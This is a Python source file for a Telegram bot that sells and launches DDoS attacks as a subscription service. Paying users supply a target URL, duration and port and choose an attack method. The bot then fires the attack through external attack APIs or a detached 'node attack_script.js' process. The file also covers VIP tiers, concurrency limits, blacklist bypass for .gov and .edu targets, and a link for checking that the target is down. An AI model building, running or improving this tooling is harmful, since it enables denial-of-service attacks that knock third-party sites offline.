from telegram import Update, InlineQueryResultArticle, InputTextMessageContent, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, InlineQueryHandler, ContextTypes, CallbackQueryHandler
from uuid import uuid4
import json
from datetime import datetime, timedelta
from urllib.parse import urlparse
import asyncio
import aiohttp
from yarl import URL
import httpx
import subprocess
import shlex


BOT_TOKEN = "BOT TOKEN HERE"
apis = [
    "https://yourapi.com/api1",
    "https://yourapi.com/api2",
    "https://yourapi.com/api3"
]

attack_icon_url = "https://i.imgur.com/PJ9x9cl.jpeg"
error_icon_url = "https://i.imgur.com/ycl7gTo.jpeg"

ADMIN_IDS = [5145402317, 87654321] #SET YOUR ADMIN IDS HERE
from functions import ban_user, unban_user, blacklist_command,running_command,method_command,list_banned,plan,start

async def send_to_webhook(full_name, url, time, port, method):
  bot_token = "YOUR WEBHOOK BOT TOKEN HERE"
  chat_id = "YOUR WEBHOOK CHAT ID HERE" 
  text = (
      f"```\n"
      f"User: {full_name}\n"
      f"Url: {url}\n"
      f"Time: {time}s\n"
      f"Port: {port}\n"
      f"Method: {method}\n"
      f"```"
  )

  url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
  payload = {
      "chat_id": chat_id,
      "text": text,
      "parse_mode": "MarkdownV2"
  }

  async with httpx.AsyncClient() as client:
      try:
          response = await client.post(url, json=payload)
          response.raise_for_status()
      except httpx.HTTPStatusError as e:
          print(f"HTTP error occurred: {e}")  
      except httpx.RequestError as e:
          print(f"Request error occurred: {e}") 


async def call_api(url, time, port, method, apis):
  params = {
      "url": url,
      "time": time,
      "port": port,
      "method": method
  }

  async with aiohttp.ClientSession() as session:
    for api_url in apis:
      try:
          full_url = URL(api_url).with_query(params)
          async with session.get(full_url) as response:
              response.raise_for_status()
      except aiohttp.ClientResponseError as e:
          print(f"HTTP error occurred at {api_url}: {e}")
      except aiohttp.ClientError as e:
          print(f"Request error occurred at {api_url}: {e}")
      except Exception as e:
          print(f"An error occurred at {api_url}: {e}")
    return
      

def run_script(url, time, port, method_name):
  command = f"screen -dmS attack-{port} bash -c 'timeout {time}s node attack_script.js {url} {time} {port} {method_name}'"

  command = shlex.split(command)
  try:
      subprocess.Popen(command)
      print(f"Started attack on {url} at port {port} with method {method_name} for {time} seconds.")
  except Exception as e:
      print(f"Failed to start script: {str(e)}")


async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
  user_id = update.effective_user.id
  if user_id not in ADMIN_IDS:
      return

  args = context.args
  if len(args) != 6:
      await update.message.reply_text("Usage: /add [id] [time] [concurrent] [expire_in_days] [vip] [bypass blacklist]\nExample:<code> /add 5145402317 300 5 60 true false</code>",parse_mode='HTML')
      return

  user_id, time, concurrent, expire_in_days, vip, bypass_blacklist = args
  try:
      time = int(time)
      concurrent = int(concurrent)
      expire_in_days = int(expire_in_days)
      vip = True if vip.lower() == 'true' else False
      bypass_blacklist = True if bypass_blacklist.lower() == 'true' else False

      expire_datetime = datetime.utcnow() + timedelta(days=expire_in_days)
      expire_iso = expire_datetime.isoformat()


      with open('users.json', 'r+') as file:
          users = json.load(file)
          users[user_id] = {
              "time": time,
              "concurrent": concurrent,
              "vip": vip,
              "expire": expire_iso,
              "banned": False,
              "bypass_blacklist": bypass_blacklist
          }
          file.seek(0)
          json.dump(users, file, indent=4)
          file.truncate()

      await update.message.reply_text(f"User <code>{user_id}</code> added/updated with | Time={time} | Concurrent={concurrent} | VIP={vip} | Bypass blacklist={bypass_blacklist} | Expires on {expire_iso}",parse_mode="HTML")

  except ValueError:
      await update.message.reply_text("Error: Ensure that all parameters are correctly formatted.")
    

def load_methods():
  with open('methods.json', 'r') as file:
      return json.load(file)

def load_user_plans():
  with open('users.json', 'r') as file:
      return json.load(file)

def create_results(methods, url, time, port, is_vip):
  results = []
  for method in methods:
      if is_vip or not method['vip']:
          keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("Start Attack 🚀", callback_data=f"attack|{url}|{time}|{port}|{method['name']}")]])
          results.append(
              InlineQueryResultArticle(
                  id=str(uuid4()),
                  title=f"{method['name']} (⚜️VIP⚜️)" if method['vip'] else method['name'],
                  description=method['description'],
                  thumbnail_url=attack_icon_url,
                  input_message_content=InputTextMessageContent(
                      f"Target: {url}\nTime: {time}\nPort: {port}\nMethod: {method['name']}"
                  ),
                  reply_markup=keyboard
              )
          )
  return results


async def handle_inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
  query = update.inline_query.query
  if not query:
      await update.inline_query.answer([], cache_time=1)
      return
  with open('blacklist.json', 'r') as file:
    blacklist = json.load(file)


  user_plans = load_user_plans()
  user_id = str(update.effective_user.id)
  user_plan = user_plans.get(user_id)
  running_attacks_count = count_running_attacks(int(user_id))
  conc = user_plan['concurrent']

  if not user_plan or datetime.now() > datetime.fromisoformat(user_plan['expire']):
    results = [
        InlineQueryResultArticle(
            id=str(uuid4()),
            title="No Plan",
            description="You do not have an active plan.",
            thumbnail_url=error_icon_url,
            input_message_content=InputTextMessageContent(
                "You do not have an active plan. Please purchase a plan to use this service."
            )
        )
    ]
    await update.inline_query.answer(results, cache_time=1)
    return

  if user_plan.get('banned', False):
    await update.inline_query.answer([
        InlineQueryResultArticle(
            id=str(uuid4()),
            title="Banned",
            description="You are banned from using this service.",
            thumbnail_url=error_icon_url,
            input_message_content=InputTextMessageContent("You are banned from using this service.")
        )
    ], cache_time=1)
    return
  

  methods = load_methods()
  parts = query.split()
  if len(parts) < 3:
      results = [
          InlineQueryResultArticle(
            id=str(uuid4()),
            title="Invalid input",
            description="Usage: url time port method",
            thumbnail_url=error_icon_url,input_message_content=InputTextMessageContent(
                  "Invalid input. Please use the format: 'url time port method'."
              )
          )
      ]

  elif int(parts[1]) > user_plan['time']:
      results = [
          InlineQueryResultArticle(
            id=str(uuid4()),
            title="Excessive Time",
            description=f"Time limit: {user_plan['time']}s",
            thumbnail_url=error_icon_url,
            input_message_content=InputTextMessageContent(
                f"Time limit: {user_plan['time']}s"
            )
        )
      ]
  elif running_attacks_count >= int(conc):
      results = [
          InlineQueryResultArticle(
            id=str(uuid4()),
            title="Reached The Limit",
            description=f"You have reached the limit of concurrent\nCouncurrent limit: {conc}",
            thumbnail_url=error_icon_url,
            input_message_content=InputTextMessageContent(
                f"You have reached the limit of concurrent\nCouncurrent limit: {conc}"
            )
        )
      ]

  
  else:
      url, time, port = parts
      is_vip = user_plan.get('vip', False)
      parsed_url = urlparse(url)
      domain = parsed_url.netloc or parsed_url.path

      if not domain:
        if '/' in url:
            domain = url.split('/')[0]
        else:
            domain = url
      if not time.isdigit() or not port.isdigit():
        results = [
          InlineQueryResultArticle(
              id=str(uuid4()),
              title="Invalid input", 
              description="Invalid input. 'time' and 'port' must be a number.",
              thumbnail_url=error_icon_url,
              input_message_content=InputTextMessageContent(
                  "Invalid input. 'time' and 'port' must be a number."
              )
          )
        ]

      elif (domain in blacklist or domain.endswith('.gov') or domain.endswith('.edu')) and not user_plan.get('bypass_blacklist', False):
        results = [InlineQueryResultArticle(
            id=str(uuid4()),
            title="Blacklist Target",
            description="The target is blacklisted.",
            thumbnail_url=error_icon_url,
            input_message_content=InputTextMessageContent(
                f"Target {domain} is blacklisted."
            )
        )]
      else:
        results = create_results(methods, url, time, port, is_vip)
        
        
  await update.inline_query.answer(results, cache_time=1)
  

async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
  query = update.callback_query
  await query.answer()
  user_id=query.from_user.id
  user_plans = load_user_plans()
  user_plan = user_plans.get(str(user_id))
  conc = user_plan['concurrent']
  full_name = query.from_user.full_name

  data = query.data
  if data.startswith("attack|"):
      _, url, time, port, method_name = data.split("|")

      running_attacks_count = count_running_attacks(user_id)
      if running_attacks_count >= int(conc):
          await query.edit_message_text(
            f"You have reached the limit of concurrent attacks.\n "
            f"Using: {running_attacks_count}/{conc}"
          )
          return
        

      attack_id = await start_attack(user_id, url, time, port, method_name)
      check_host_url = f"https://check-host.net/check-http?host={url}"
      button = InlineKeyboardButton(text="Check Host 🔎", url=check_host_url)
      markup = InlineKeyboardMarkup([[button]])

      await query.edit_message_text(
          f"<code>Attack on {url} using {method_name} for {time} seconds on port {port} has started</code>",
          parse_mode='HTML',
          reply_markup=markup
      )
      #await call_api(url, time, port, method_name, apis)
      #await run_script(url, time, port, method_name)
      await send_to_webhook(full_name, url, time, port,method_name)
      



async def start_attack(user_id, url, time, port, method_name):
    with open('running.json', 'r+') as file:
        try:
            running_attacks = json.load(file)
        except json.JSONDecodeError:
            running_attacks = {}

        end_time = datetime.utcnow() + timedelta(seconds=int(time))
        attack_id = str(uuid4())

        running_attacks[attack_id] = {
            "user_id": user_id,
            "url": url,
            "time": time,
            "port": port,
            "method_name": method_name,
            "end_time": end_time.isoformat()
        }

        file.seek(0)
        json.dump(running_attacks, file, indent=4)
        file.truncate()

    asyncio.create_task(end_attack(attack_id, time))

    return attack_id

async def end_attack(attack_id, delay):
  await asyncio.sleep(int(delay))
  with open('running.json', 'r+') as file:
      running_attacks = json.load(file)
      if attack_id in running_attacks:
          del running_attacks[attack_id]

      file.seek(0)
      json.dump(running_attacks, file, indent=4)
      file.truncate()


def count_running_attacks(user_id):
  with open('running.json', 'r') as file:
      try:
          running_attacks = json.load(file)
      except json.JSONDecodeError:
          return 0  

      current_time = datetime.utcnow()
      count = 0
      for attack in running_attacks.values():
          if attack['user_id'] == user_id and datetime.fromisoformat(attack['end_time']) > current_time:
              count += 1

      return count


app = ApplicationBuilder().token(BOT_TOKEN).build()


app.add_handler(InlineQueryHandler(handle_inline_query))
app.add_handler(CallbackQueryHandler(handle_callback_query))
app.add_handler(CommandHandler("bl", blacklist_command))
app.add_handler(CommandHandler("add", add_user))
app.add_handler(CommandHandler("ban", ban_user))
app.add_handler(CommandHandler("unban", unban_user))
app.add_handler(CommandHandler("running", running_command))
app.add_handler(CommandHandler("method", method_command))
app.add_handler(CommandHandler("listban", list_banned))
app.add_handler(CommandHandler("plan", plan))
app.add_handler(CommandHandler("start", start))


app.run_polling()
